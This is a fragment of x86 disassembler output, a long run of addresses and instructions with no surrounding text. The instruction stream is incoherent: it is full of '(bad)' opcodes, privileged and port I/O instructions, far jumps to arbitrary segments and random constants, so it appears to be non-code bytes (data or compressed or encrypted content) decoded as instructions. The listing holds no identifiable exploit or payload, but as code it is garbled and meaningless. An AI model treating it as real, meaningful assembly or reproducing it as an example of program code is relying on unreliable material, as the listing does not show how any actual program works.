  529c5d:	or     DWORD PTR [edx],eax
  529c5f:	xor    ebx,esi
  529c61:	and    edx,ebp
  529c63:	hlt    
  529c64:	xor    BYTE PTR [ebp+0x31b1270c],bl
  529c6a:	xchg   ebp,eax
  529c6b:	rcr    esi,cl
  529c6d:	nop
  529c6e:	enter  0x327a,0x1e
  529c72:	jg     0x529cf1
  529c74:	popf   
  529c75:	shr    BYTE PTR [esi],1
  529c77:	sahf   
  529c78:	ja     0x529ca4
  529c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  529c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  529c7c:	mov    al,0xad
  529c7e:	call   0x27cb:0xca426848
  529c85:	int3   
  529c86:	jbe    0x529c16
  529c88:	xor    edi,ebp
  529c8a:	lds    ecx,FWORD PTR [eax]
  529c8c:	add    BYTE PTR ds:0xd8ca6675,0xb0
  529c93:	push   0x53
  529c95:	jb     0x529c9a
  529c97:	scas   eax,DWORD PTR es:[edi]
  529c98:	or     ch,bh
  529c9a:	in     al,dx
  529c9b:	in     eax,0x1b
  529c9d:	jmp    0x5d49:0xe2fd757f
  529ca4:	in     al,0xc2
  529ca6:	mov    dl,0xdf
  529ca8:	jne    0x529c48
  529caa:	pop    esp
  529cab:	xor    eax,0xa6ee3911
  529cb0:	mul    DWORD PTR [ebp-0x38]
  529cb3:	or     al,BYTE PTR ds:0xb1c63c7c
  529cb9:	adc    al,BYTE PTR [ebx]
  529cbb:	and    al,0xa2
  529cbd:	inc    ecx
  529cbe:	jmp    0x69a480fa
  529cc3:	xchg   edx,eax
  529cc4:	inc    eax
  529cc5:	inc    ebx
  529cc6:	icebp  
  529cc7:	cmc    
  529cc8:	mov    ds:0xe78a5ba3,al
  529ccd:	test   dl,dl
  529ccf:	jae    0x529d48
  529cd1:	xchg   ebx,eax
  529cd2:	push   0x7e
  529cd4:	into   
  529cd5:	pop    ds
  529cd6:	cmc    
  529cd7:	push   ss
  529cd8:	ret    0x5b2c
  529cdb:	mov    eax,0xc1149a1e
  529ce0:	sub    DWORD PTR [ecx-0x37],ecx
  529ce3:	cmp    bl,BYTE PTR [ecx]
  529ce5:	adc    BYTE PTR ds:0x2be600a8,al
  529ceb:	pop    ebx
  529cec:	inc    esi
  529ced:	(bad)  
  529cee:	int3   
  529cef:	xchg   esp,esp
  529cf1:	xor    ch,BYTE PTR [ecx-0x42a1db3f]
  529cf7:	(bad)  
  529cf8:	mov    esi,0x9bd1cd67
  529cfd:	xchg   edi,eax
  529cfe:	cdq    
  529cff:	test   eax,0x589330bd
  529d04:	mov    ebp,0xe29aeb58
  529d09:	xchg   ecx,eax
  529d0a:	mov    DWORD PTR [ebx-0x71],ecx
  529d0d:	clc    
  529d0e:	test   BYTE PTR [eax+0x69],0xae
  529d12:	popa   
  529d13:	cmp    eax,0xfd63546a
  529d18:	inc    esp
  529d19:	xor    al,0xcc
  529d1b:	jmp    0x8a82fa53
  529d20:	pop    ds
  529d21:	push   0x4ed5360
  529d26:	sub    dl,BYTE PTR [ecx]
  529d28:	jmp    0x529d50
  529d2a:	dec    edx
  529d2b:	inc    esp
  529d2c:	xchg   esi,eax
  529d2d:	xchg   BYTE PTR [ebx+0x611ef28],dh
  529d33:	shl    bh,cl
  529d35:	xchg   esp,eax
  529d36:	and    BYTE PTR [ecx+0x1fab9bd3],bh
  529d3c:	mov    dh,0xfa
  529d3e:	fnstcw WORD PTR [ebp+0x5d08b0f1]
  529d44:	and    al,0x10
  529d46:	stos   BYTE PTR es:[edi],al
  529d47:	jno    0x529d67
  529d49:	dec    ecx
  529d4a:	popf   
  529d4b:	call   0x7c7cc9bc
  529d50:	dec    edx
  529d51:	loope  0x529d35
  529d53:	jp     0x529d47
  529d55:	mov    DWORD PTR [ecx+0x740b20fc],edi
  529d5b:	cs (bad) 
  529d5d:	mov    WORD PTR [edi+0x501f4e00],cs
  529d63:	xchg   ebp,eax
  529d64:	mov    cl,0x78
  529d66:	dec    eax
  529d67:	mov    bl,ch
  529d69:	hlt    
  529d6a:	jne    0x529db1
  529d6c:	leave  
  529d6d:	or     cl,al
  529d6f:	or     al,0x12
  529d71:	push   ecx
  529d72:	call   0x9239:0x6afe85b8
  529d79:	inc    ebp
  529d7a:	add    ecx,0x784666a7
  529d80:	das    
  529d81:	pop    edx
  529d82:	xchg   esp,eax
  529d83:	cld    
  529d84:	lods   eax,DWORD PTR ds:[esi]
  529d85:	mov    bh,0x78
  529d87:	mov    cl,0x4b
  529d89:	inc    eax
  529d8a:	mov    DWORD PTR [edi],edi
  529d8c:	popf   
  529d8d:	jl     0x529db7
  529d8f:	inc    edi
  529d90:	push   es
  529d91:	xchg   esp,eax
  529d92:	and    cl,bh
  529d94:	cmp    DWORD PTR [ecx],eax
  529d96:	call   0xb20c:0xa597cbe3
  529d9d:	fcomp  DWORD PTR [eax]
  529d9f:	sub    ecx,DWORD PTR [eax+0x2f]
  529da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  529da3:	xor    BYTE PTR [esi],bl
  529da5:	lock std 
  529da7:	dec    edi
  529da8:	jae    0x529d7d
  529daa:	and    BYTE PTR [ebp-0xc46bdec],0x7b
  529db1:	inc    esi
  529db2:	xchg   ebp,eax
  529db3:	in     al,dx
  529db4:	adc    dl,BYTE PTR [eax]
  529db6:	jbe    0x529dff
  529db8:	adc    esi,DWORD PTR [esi]
  529dba:	js     0x529d8f
  529dbc:	jmp    0xf72fd313
  529dc1:	popa   
  529dc2:	(bad)  
  529dc3:	(bad)  
  529dc4:	cmp    al,BYTE PTR [esi-0x5c25b3bb]
  529dca:	jbe    0x529e39
  529dcc:	sbb    al,0x2c
  529dce:	ins    DWORD PTR es:[edi],dx
  529dcf:	je     0x529d67
  529dd1:	sti    
  529dd2:	push   es
  529dd3:	lahf   
  529dd4:	cmp    ebx,edi
  529dd6:	xchg   ecx,eax
  529dd7:	mov    ds,ebp
  529dd9:	ins    DWORD PTR es:[edi],dx
  529dda:	mov    bh,0x87
  529ddc:	nop
  529ddd:	ins    DWORD PTR es:[edi],dx
  529dde:	out    dx,al
  529ddf:	push   edi
  529de0:	arpl   WORD PTR [eax+0xad41693],sp
  529de6:	(bad)  
  529de7:	jae    0x529dc0
  529de9:	popf   
  529dea:	mov    ebp,0x1f28e945
  529def:	ins    BYTE PTR es:[edi],dx
  529df0:	and    ecx,DWORD PTR [eax-0xd9b6080]
  529df6:	stos   DWORD PTR es:[edi],eax
  529df7:	mov    al,fs:0x26a0e2bf
  529dfd:	add    eax,0x292e4dd8
  529e02:	stc    
  529e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  529e04:	mov    DWORD PTR [esi+0x29],esp
  529e07:	(bad)  
  529e08:	jns    0x529da6
  529e0a:	mul    BYTE PTR [ebx+0x15a21513]
  529e10:	test   ebp,0xd7927060
  529e16:	mov    ds:0xe6181adf,al
  529e1b:	clc    
  529e1c:	je     0x529dd8
  529e1e:	pop    ebx
  529e1f:	mov    ?,WORD PTR [ebp+0x518b692d]
  529e25:	jns    0x529e2a
  529e27:	retf   
  529e28:	pop    eax
  529e29:	jnp    0x529e08
  529e2b:	push   ds
  529e2c:	jne    0x529e45
  529e2e:	mov    WORD PTR [edx-0x512d2b42],ds
  529e34:	imul   ecx,DWORD PTR [eax-0x1d],0xfffffffe
  529e38:	fidivr WORD PTR [esi+0x69ba90f6]
  529e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  529e3f:	leave  
  529e40:	cmp    DWORD PTR [eax+0x2e],eax
  529e43:	repnz mov ebp,0x7973a190
  529e49:	and    esi,DWORD PTR [ecx+0x13706e25]
  529e4f:	mov    bl,0x9b
  529e51:	sub    edx,DWORD PTR ds:0xc1012e17
  529e57:	std    
  529e58:	repnz cs mul ah
  529e5c:	aas    
  529e5d:	call   0x8d69b120
  529e62:	push   ds
  529e63:	push   cs
  529e64:	scas   al,BYTE PTR es:[edi]
  529e65:	sub    BYTE PTR [ecx-0x7efece74],ah
  529e6b:	outs   dx,BYTE PTR ds:[esi]
  529e6c:	adc    al,0x31
  529e6e:	sub    dh,ah
  529e70:	add    edi,eax
  529e72:	test   DWORD PTR [esi+esi*1+0x58e6d829],edi
  529e79:	sbb    eax,0x110c1a1e
  529e7e:	in     al,dx
  529e7f:	dec    esi
  529e80:	mov    ebx,0xe8a0a762
  529e85:	test   BYTE PTR [ecx-0x38],cl
  529e88:	push   es
  529e89:	or     DWORD PTR [eax],eax
  529e8b:	sbb    DWORD PTR [ecx-0x66],0x2f
  529e8f:	push   eax
  529e90:	rcl    al,1
  529e92:	mov    ds:0xd19d94f8,eax
  529e97:	(bad)  
  529e98:	pop    ebx
  529e99:	pushf  
  529e9a:	cld    
  529e9b:	jno    0x529e56
  529e9d:	rcr    BYTE PTR [edi+ebx*4-0x1f],0xe8
  529ea2:	js     0x529e5d
  529ea4:	test   eax,eax
  529ea6:	popf   
  529ea7:	imul   esi,DWORD PTR [eax],0x19
  529eaa:	out    dx,eax
  529eab:	sbb    al,0xf9
  529ead:	xlat   BYTE PTR ds:[ebx]
  529eae:	mov    esp,0x2e711df7
  529eb3:	adc    al,0x78
  529eb5:	shl    dl,0xd8
  529eb8:	adc    eax,0x53f6f530
  529ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  529ebe:	sbb    ch,BYTE PTR [ebx]
  529ec0:	sbb    DWORD PTR [ebx+edx*8],edi
  529ec3:	pop    es
  529ec4:	aam    0x90
  529ec6:	mov    bh,0x86
  529ec8:	shr    BYTE PTR [ebp-0xd9831b1],0x9b
  529ecf:	push   cs
  529ed0:	ds call 0x641:0xcedc0e6d
  529ed8:	aad    0x1e
  529eda:	inc    ebp
  529edb:	jge    0x529e7c
  529edd:	sbb    DWORD PTR [esi+0x1977ad79],esi
  529ee3:	sub    al,0x67
  529ee5:	add    esp,DWORD PTR [eax-0x67]
  529ee8:	fisubr DWORD PTR [ebx-0x58]
  529eeb:	pop    esp
  529eec:	sbb    al,0x86
  529eee:	sar    DWORD PTR [eax],0x10
  529ef1:	sub    bh,BYTE PTR [esi+0x278762e9]
  529ef7:	xor    al,0x9d
  529ef9:	xchg   esp,eax
  529efa:	pushf  
  529efb:	(bad)  
  529efd:	mov    ebx,0xf8df715f
  529f02:	bound  esp,QWORD PTR [esi]
  529f04:	and    DWORD PTR [esi],esp
  529f06:	jge    0x529f77
  529f08:	fistp  DWORD PTR [ecx+0x4d]
  529f0b:	adc    al,0x52
  529f0d:	dec    edx
  529f0e:	ss pop ds
  529f10:	add    eax,0x14b267c1
  529f15:	jmp    0xcbf1b971
  529f1a:	sti    
  529f1b:	call   0xa9ab:0x626dd6a4
  529f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  529f23:	adc    BYTE PTR [eax+0x16],0x2e
  529f27:	fst    QWORD PTR [eax+eax*4]
  529f2a:	push   ebx
  529f2c:	xchg   ecx,eax
  529f2d:	leave  
  529f2e:	fild   QWORD PTR ds:0x388b0b9f
  529f34:	push   ds
  529f35:	dec    ecx
  529f36:	or     BYTE PTR [ecx],bh
  529f38:	je     0x529f57
  529f3a:	ret    
  529f3b:	test   al,0x78
  529f3d:	push   edx
  529f3e:	pop    esp
  529f3f:	retf   0x885e
  529f42:	addr16 jp 0x529f8f
  529f45:	inc    cx
  529f47:	test   al,0x52
  529f49:	mov    edx,0xe84a5645
  529f4e:	adc    ah,BYTE PTR [eax+0x501442c]
  529f54:	nop
  529f55:	mov    ch,0xfc
  529f57:	popa   
  529f58:	xchg   edi,eax
  529f59:	rcr    BYTE PTR [eax-0x37a4e390],1
  529f5f:	push   eax
  529f60:	jno    0x529f30
  529f62:	inc    esi
  529f63:	loope  0x529f06
  529f65:	pop    esi
  529f66:	lds    esi,FWORD PTR [ecx+0xcab0d7d]
  529f6c:	enter  0x9ffd,0x18
  529f70:	in     al,dx
  529f71:	mul    ebp
  529f73:	jmp    0x62f8:0xfbc8ac45
  529f7a:	xchg   esi,eax
  529f7b:	hlt    
  529f7c:	inc    edx
  529f7d:	sahf   
  529f7e:	pop    eax
  529f7f:	sub    dl,dh
  529f81:	push   esp
  529f82:	jl     0x529f30
  529f84:	pop    ebp
  529f85:	and    DWORD PTR [eax+0x4e],edx
  529f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  529f89:	rcr    ecx,cl
  529f8b:	loop   0x529fb6
  529f8d:	std    
  529f8e:	inc    edi
  529f8f:	xchg   edx,eax
  529f90:	cmp    DWORD PTR [ebx+eiz*4],0xffffffc4
  529f94:	aas    
  529f95:	pusha  
  529f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  529f97:	inc    ebx
  529f98:	dec    edi
  529f99:	aas    
  529f9a:	std    
  529f9b:	rol    DWORD PTR [edx+0x66],0x91
  529f9f:	mov    DWORD PTR ds:[esi],esi
  529fa2:	and    eax,0x761b805d
  529fa7:	dec    ebp
  529fa8:	lds    sp,DWORD PTR [ebp+0x78]
  529fac:	inc    DWORD PTR ds:0xf6623a6b
  529fb2:	add    eax,0xa93cec04
  529fb7:	lea    edi,[ebx+eax*2-0x4c]
  529fbb:	fdiv   QWORD PTR [eax+0x55]
  529fbe:	das    
  529fbf:	stc    
  529fc0:	cli    
  529fc1:	in     eax,dx
  529fc2:	xor    ecx,DWORD PTR [ebx+0x52]
  529fc5:	pop    es
  529fc6:	inc    esp
  529fc7:	pcmpeqw mm3,QWORD PTR [edi]
  529fca:	push   cs
  529fcb:	or     ecx,DWORD PTR [edx+0x1abd399b]
  529fd1:	or     dl,BYTE PTR [eax+0x4]
  529fd4:	pop    eax
  529fd5:	inc    ebp
  529fd6:	jmp    0x44612e45
  529fdb:	int    0xb1
  529fdd:	xlat   BYTE PTR ds:[ebx]
  529fde:	inc    esp
  529fdf:	dec    ebp
  529fe0:	icebp  
  529fe1:	ret    
  529fe2:	and    BYTE PTR [edi],dl
  529fe4:	dec    eax
  529fe5:	xor    cl,bl
  529fe7:	inc    edi
  529fe8:	ds in  eax,dx
  529fea:	in     eax,0x9
  529fec:	mov    dh,ch
  529fee:	in     eax,0x8b
  529ff0:	push   edx
  529ff1:	or     al,0x9c
  529ff3:	mov    ecx,0xea72cae7
  529ff8:	idiv   bh
  529ffa:	jno    0x529ffe
  529ffc:	mov    dh,0x29
  529ffe:	add    ecx,eax
  52a000:	sub    al,0x5
  52a002:	jnp    0x529ff5
  52a004:	mov    BYTE PTR ds:0x90d1b2b1,al
  52a00a:	inc    esi
  52a00b:	push   ebp
  52a00c:	sahf   
  52a00d:	call   DWORD PTR [edi-0x1043fe8f]
  52a013:	sub    cl,BYTE PTR [ecx]
  52a015:	mov    ah,0x67
  52a017:	jle    0x52a00a
  52a019:	test   BYTE PTR [ecx],cl
  52a01b:	int    0x61
  52a01d:	popa   
  52a01e:	cmp    ebp,DWORD PTR [ebp-0x4204f6d0]
  52a024:	pop    ebp
  52a025:	mov    ebp,0xad31e1f4
  52a02a:	xlat   BYTE PTR ds:[ebx]
  52a02b:	push   ebp
  52a02c:	inc    ebx
  52a02d:	push   0x62
  52a02f:	test   eax,0x7922b412
  52a034:	mov    ecx,0x3bca363d
  52a039:	dec    ebp
  52a03a:	add    bl,BYTE PTR [esi]
  52a03c:	stc    
  52a03d:	fisttp DWORD PTR [ecx+0x5bd724ad]
  52a043:	jae    0x529fef
  52a045:	pop    esi
  52a046:	call   0xacd61357
  52a04b:	sbb    BYTE PTR [ebx+0x470d7e06],0x99
  52a052:	lds    esi,FWORD PTR [ebx-0x452ae8fe]
  52a058:	ja     0x52a019
  52a05a:	pop    es
  52a05b:	fucom  st(2)
  52a05d:	add    edi,edi
  52a05f:	shl    DWORD PTR [ecx-0x2c63d20c],0x71
  52a066:	jmp    0x52a04e
  52a068:	sahf   
  52a069:	test   DWORD PTR [eax-0x27],edi
  52a06c:	mov    ds:0x83e7f4cc,al
  52a071:	push   edi
  52a072:	je     0x52a03a
  52a074:	test   al,0x75
  52a076:	add    eax,0x31bfae77
  52a07b:	pop    ebx
  52a07c:	imul   edx,ecx,0x333eb6fb
  52a082:	jnp    0x52a057
  52a084:	fnstsw WORD PTR [edi+ebp*2-0x73318c21]
  52a08b:	push   ss
  52a08c:	sbb    BYTE PTR [ebx],ch
  52a08e:	mov    bh,0x37
  52a090:	(bad)  
  52a091:	aam    0x97
  52a093:	sahf   
  52a094:	std    
  52a095:	retf   0x4f1
  52a098:	(bad)  
  52a09a:	pop    ebp
  52a09b:	jno    0x52a0f9
  52a09d:	push   edi
  52a09e:	out    0x95,al
  52a0a0:	icebp  
  52a0a1:	je     0x52a096
  52a0a3:	call   0x81ee:0x5d01cb85
  52a0aa:	lods   eax,DWORD PTR ds:[esi]
  52a0ab:	jbe    0x52a06a
  52a0ad:	xor    bl,dl
  52a0af:	lock enter 0x73a7,0x9b
  52a0b4:	iret   
  52a0b5:	mov    dh,0xd1
  52a0b7:	mov    ds:0xff675460,eax
  52a0bc:	bound  edx,QWORD PTR [eax-0xc]
  52a0bf:	sti    
  52a0c0:	push   ds
  52a0c1:	jmp    0x52a0a9
  52a0c3:	sub    DWORD PTR [edx-0x58],0xd7984576
  52a0ca:	lods   al,BYTE PTR ds:[esi]
  52a0cb:	xchg   ecx,eax
  52a0cc:	pop    ss
  52a0cd:	or     al,0x9b
  52a0cf:	pusha  
  52a0d0:	xor    BYTE PTR [edi],0xd9
  52a0d3:	mov    al,ds:0x762b2653
  52a0d8:	in     al,0xe2
  52a0da:	cli    
  52a0db:	cld    
  52a0dc:	inc    ebp
  52a0dd:	pop    ss
  52a0de:	out    0x14,al
  52a0e0:	cld    
  52a0e1:	fcomip st,st(7)
  52a0e3:	cmp    al,BYTE PTR [ecx-0x55]
  52a0e6:	mov    eax,0xaabd2e61
  52a0eb:	outs   dx,DWORD PTR ds:[esi]
  52a0ec:	jne    0x52a142
  52a0ee:	lods   eax,DWORD PTR ds:[esi]
  52a0ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52a0f0:	and    dh,bl
  52a0f2:	xchg   DWORD PTR [edi+0x21fe86d7],eax
  52a0f8:	loop   0x52a125
  52a0fa:	jnp    0x52a0ea
  52a0fc:	adc    DWORD PTR [bx+0x63f3],0x8a1b27b
  52a105:	rcr    ecx,1
  52a107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52a108:	mov    ebx,0x4e2711a5
  52a10d:	and    DWORD PTR [esi+0x4a],ebp
  52a110:	ss hlt 
  52a112:	mov    WORD PTR [esi],ds
  52a114:	in     al,dx
  52a115:	cdq    
  52a116:	cs popa 
  52a118:	iret   
  52a119:	or     DWORD PTR [edi+0x3d],esi
  52a11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52a11d:	mov    eax,0xfbdb88de
  52a122:	push   0xffffff91
  52a124:	push   edx
  52a125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52a126:	lock das 
  52a128:	or     edx,0x9
  52a12b:	fisttp WORD PTR [edx]
  52a12d:	cdq    
  52a12e:	sbb    ecx,ecx
  52a130:	lahf   
  52a131:	xor    eax,0x1627a8e1
  52a136:	pop    esi
  52a137:	xchg   edx,eax
  52a138:	xor    ah,bh
  52a13a:	fstp   TBYTE PTR [ebx+0x50101897]
  52a140:	sbb    bh,BYTE PTR [eax+0x1938753]
  52a146:	dec    ecx
  52a147:	xor    esi,DWORD PTR [ebx+0x3fea83ce]
  52a14d:	xor    bl,BYTE PTR [edi+0x1b]
  52a150:	mov    BYTE PTR [edx],dh
  52a152:	xor    eax,0xd19b0c52
  52a157:	les    esp,FWORD PTR [esi-0x26c4376a]
  52a15d:	xor    ebx,DWORD PTR [edi-0x7a]
  52a160:	add    DWORD PTR [eax],edx
  52a162:	mov    DWORD PTR [edx-0x51a4976a],ecx
  52a168:	sbb    DWORD PTR [ecx],0x7e
  52a16b:	inc    ebp
  52a16c:	pusha  
  52a16d:	push   esi
  52a16e:	mov    ebp,cr0
  52a171:	je     0x52a1b6
  52a173:	cmp    eax,0x364350e9
  52a178:	add    BYTE PTR [eax],al
  52a17a:	ficomp DWORD PTR [eax]
  52a17c:	xor    edx,ebp
  52a17e:	and    eax,0x13364ad6
  52a183:	mov    ch,0x87
  52a185:	pusha  
  52a186:	out    0x34,al
  52a188:	cld    
  52a189:	sbb    esp,DWORD PTR [edi]
  52a18b:	das    
  52a18c:	rcr    DWORD PTR [ebx-0x392a9981],1
  52a192:	cmp    BYTE PTR [esi+esi*4-0x26928e83],ah
  52a199:	mov    esp,DWORD PTR [edi-0x53837aae]
  52a19f:	push   ebp
  52a1a0:	repz out dx,al
  52a1a2:	pop    esi
  52a1a3:	dec    eax
  52a1a4:	inc    edi
  52a1a5:	pop    ebx
  52a1a6:	inc    ebx
  52a1a7:	mov    esp,DWORD PTR [ecx+ebp*8-0x21]
  52a1ab:	add    DWORD PTR [esi+0x32],esp
  52a1ae:	mov    bl,BYTE PTR [ebx-0x74f13e15]
  52a1b4:	imul   ecx,DWORD PTR [eax],0x2ca8deda
  52a1ba:	arpl   WORD PTR [edx-0x2b],dx
  52a1bd:	pop    esp
  52a1be:	int3   
  52a1bf:	cdq    
  52a1c0:	rcr    DWORD PTR [ebx-0x4f],cl
  52a1c3:	nop    DWORD PTR [edi-0x4f60c439]
  52a1ca:	pop    ss
  52a1cb:	and    BYTE PTR [edx+0x183138d7],0xf3
  52a1d2:	inc    edi
  52a1d3:	mov    ch,0x79
  52a1d5:	arpl   WORD PTR [esp+esi*4+0x7ea1d81f],ax
  52a1dc:	lods   al,BYTE PTR ds:[esi]
  52a1dd:	dec    DWORD PTR es:[edx-0x55]
  52a1e1:	pop    eax
  52a1e2:	shl    DWORD PTR [ebx],0xa5
  52a1e5:	call   0x2cb:0xaad25403
  52a1ec:	jnp    0x52a1ea
  52a1ee:	dec    eax
  52a1ef:	shl    DWORD PTR ds:0xe5c98578,1
  52a1f5:	push   cs
  52a1f6:	mov    ?,WORD PTR [edi-0x19]
  52a1f9:	mov    ah,0xdd
  52a1fb:	xor    eax,edi
  52a1fd:	adc    DWORD PTR [ebp+0x79],0xa95a93e1
  52a204:	lock fild WORD PTR [edx]
  52a207:	sbb    BYTE PTR [edx],ch
  52a209:	mov    bh,0x1
  52a20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52a20c:	inc    edx
  52a20d:	int    0xa7
  52a20f:	cld    
  52a210:	adc    esi,eax
  52a212:	push   edi
  52a213:	xchg   ecx,eax
  52a214:	or     dl,BYTE PTR [ecx]
  52a216:	out    dx,eax
  52a217:	call   0x3f265091
  52a21c:	retf   0x78cc
  52a21f:	sbb    DWORD PTR [ecx],edx
  52a221:	xor    eax,0xe6c56e72
  52a226:	sub    dh,BYTE PTR [eax+0x45]
  52a229:	xchg   esi,eax
  52a22a:	scas   eax,DWORD PTR es:[edi]
  52a22b:	and    ch,bh
  52a22d:	(bad)  
  52a22e:	stc    
  52a22f:	xor    al,0xd5
  52a231:	or     al,0xc
  52a233:	out    dx,al
  52a234:	push   esi
  52a235:	js     0x52a283
  52a237:	push   0xffffffe3
  52a239:	pop    esi
  52a23a:	add    DWORD PTR [ecx+0x3d1a6d10],ebx
  52a240:	addr16 leave 
  52a242:	popa   
  52a243:	(bad)  [ebp+0x40ff80d4]
  52a249:	jmp    0xafe79cb7
  52a24e:	sub    DWORD PTR [esi+ebp*2-0x17],edx
  52a252:	mov    DWORD PTR [ebp+0x1e170a56],ecx
  52a258:	jg     0x52a1fa
  52a25a:	loope  0x52a2bb
  52a25c:	loope  0x52a1e9
  52a25e:	inc    esi
  52a25f:	lds    esi,FWORD PTR [edi]
  52a261:	gs ins BYTE PTR es:[edi],dx
  52a263:	sub    al,bl
  52a265:	xchg   DWORD PTR [ebp+0x44],ebx
  52a268:	les    esi,FWORD PTR [esi+0x77]
  52a26b:	push   esi
  52a26c:	retf   0x996c
  52a26f:	sub    BYTE PTR [esi+0x6b],bh
  52a272:	and    eax,0x5c479c33
  52a277:	andnps xmm6,XMMWORD PTR [edi-0x17bd70f0]
  52a27e:	mov    gs,WORD PTR [ebx+0x1ad38dee]
  52a284:	rcr    DWORD PTR [edi+0x52],cl
  52a287:	xor    DWORD PTR [ecx+0x7c],esp
  52a28a:	sub    ecx,DWORD PTR ds:[edi+0x1f22e31a]
  52a291:	add    DWORD PTR [esi+0x56aa7b5d],0x64
  52a298:	mov    dh,0xf2
  52a29a:	in     eax,0x17
  52a29c:	adc    cl,BYTE PTR [edi]
  52a29e:	xor    ch,BYTE PTR [edx]
  52a2a0:	adc    BYTE PTR [ebx+0x3d],bl
  52a2a3:	rcl    bh,0x64
  52a2a6:	sub    eax,0xb0d35b42
  52a2ab:	stc    
  52a2ac:	aas    
  52a2ad:	fndisi(8087 only) 
  52a2af:	and    DWORD PTR [ecx],edi
  52a2b1:	je     0x52a2e4
  52a2b3:	(bad)  
  52a2b5:	arpl   cx,bp
  52a2b7:	jmp    0x8ffd:0xc84e5ed7
  52a2be:	or     dl,ch
  52a2c0:	push   cs
  52a2c1:	fs sub dh,BYTE PTR ds:[ecx+0x831fc9f]
  52a2c9:	xchg   ecx,eax
  52a2ca:	ins    DWORD PTR es:[edi],dx
  52a2cb:	cwde   
  52a2cc:	adc    BYTE PTR [eax+0x223b37cf],0x31
  52a2d3:	gs out dx,eax
  52a2d5:	mov    eax,0xf08b2829
  52a2da:	sub    ecx,DWORD PTR [ecx]
  52a2dc:	fdiv   st,st(0)
  52a2de:	je     0x52a30c
  52a2e0:	jne    0x52a2f6
  52a2e2:	inc    esp
  52a2e3:	pusha  
  52a2e4:	test   bl,bh
  52a2e6:	test   DWORD PTR [ebx],eax
  52a2e8:	mov    DWORD PTR [ecx+0x354ca46f],ebx
  52a2ee:	sbb    ebx,esp
  52a2f0:	and    BYTE PTR [edx+0x49],dl
  52a2f3:	inc    esi
  52a2f4:	mov    bl,0x41
  52a2f6:	push   ecx
  52a2f7:	arpl   WORD PTR [ebx],bp
  52a2f9:	add    BYTE PTR [edx-0x1f],ch
  52a2fc:	push   esp
  52a2fd:	aad    0x75
  52a2ff:	repnz icebp 
  52a301:	nop
  52a302:	pushf  
  52a303:	sbb    BYTE PTR [ebx+ebp*2-0x75],cl
  52a307:	mov    dh,dh
  52a309:	dec    edx
  52a30a:	add    al,0x10
  52a30c:	test   DWORD PTR [ebx],esi
  52a30e:	pop    esi
  52a30f:	loop   0x52a36c
  52a311:	ds jbe 0x52a320
  52a314:	sub    dl,dh
  52a316:	jmp    0x789ce743
  52a31b:	jmp    0x52a2af
  52a31d:	mov    al,ds:0xc05b9926
  52a322:	loopne 0x52a33d
  52a324:	add    DWORD PTR [ecx-0x61688217],ecx
  52a32a:	out    0x22,al
  52a32c:	cmp    BYTE PTR [esi+0x45],0xda
  52a330:	mov    eax,ds:0x1f1afbb5
  52a335:	mov    dl,0x58
  52a337:	out    0xb9,eax
  52a339:	cmp    bl,dh
  52a33b:	mov    eax,DWORD PTR [edi-0x1d]
  52a33e:	push   0xd
  52a340:	gs mov ch,0xc1
  52a343:	jmp    0x52a390
  52a345:	idiv   BYTE PTR [edi+0x76]
  52a348:	and    DWORD PTR [esi+0x6b],esp
  52a34b:	out    0x1f,eax
  52a34d:	or     eax,0xad61f814
  52a352:	push   ss
  52a353:	scas   al,BYTE PTR es:[edi]
  52a354:	push   ss
  52a355:	inc    esp
  52a356:	les    ebp,FWORD PTR [esi]
  52a358:	loopne 0x52a2f0
  52a35a:	jnp    0x52a2e2
  52a35c:	push   0x64
  52a35e:	retf   
  52a35f:	sub    ebx,DWORD PTR [ebp+0x2f34a681]
  52a365:	and    DWORD PTR [ebx+0x68],edi
  52a368:	pop    eax
  52a369:	xor    al,0x7e
  52a36b:	xchg   esi,eax
  52a36c:	jno    0x52a319
  52a36e:	mov    cs,WORD PTR [eax+0x6f]
  52a371:	test   eax,0x2e5aa742
  52a376:	mov    ebx,0x59ec97
  52a37b:	aad    0x8b
  52a37d:	and    esp,0x26
  52a380:	inc    BYTE PTR [ebp-0x80]
  52a383:	(bad)  
  52a384:	int    0xfa
  52a386:	lods   al,BYTE PTR ds:[esi]
  52a387:	dec    ebp
  52a388:	loopne 0x52a388
  52a38a:	pop    edi
  52a38b:	jmp    0x871b:0x6e8583a1
  52a392:	ror    DWORD PTR [ebx+0x58],0x79
  52a396:	hlt    
  52a397:	jl     0x52a39f
  52a399:	xor    al,0x57
  52a39b:	or     BYTE PTR [esi],al
  52a39d:	sub    DWORD PTR [ebp-0x6000354d],ebp
  52a3a3:	mov    WORD PTR [ecx-0x1e213b2d],ds
  52a3a9:	lds    edi,FWORD PTR [edx]
  52a3ab:	(bad)  
  52a3ac:	adc    BYTE PTR [edi-0x35c67275],al
  52a3b2:	pop    es
  52a3b3:	arpl   WORD PTR [edx-0x3f],cx
  52a3b6:	inc    edi
  52a3b7:	fs sahf 
  52a3b9:	mov    ebx,0x25da6891
  52a3be:	loop   0x52a369
  52a3c0:	xor    eax,0x728d409a
  52a3c5:	push   cs
  52a3c6:	xchg   BYTE PTR [ebx+edi*2],ah
  52a3c9:	sub    BYTE PTR [edi-0x6f],bl
  52a3cc:	jmp    0xf3d4b779
  52a3d1:	or     bl,BYTE PTR [ebx+0x76]
  52a3d4:	cmp    eax,0x6b5967cd
  52a3d9:	rcr    DWORD PTR [edx+ecx*4-0x45],cl
  52a3dd:	push   0x4d
  52a3df:	pop    edi
  52a3e0:	mov    BYTE PTR [ebp+0x27],al
  52a3e3:	cmp    BYTE PTR [ebp-0x7080b9fb],ch
  52a3e9:	enter  0xfaad,0xc
  52a3ed:	jmp    0x4d49:0xc04853e0
  52a3f4:	dec    ebp
  52a3f5:	add    bh,dl
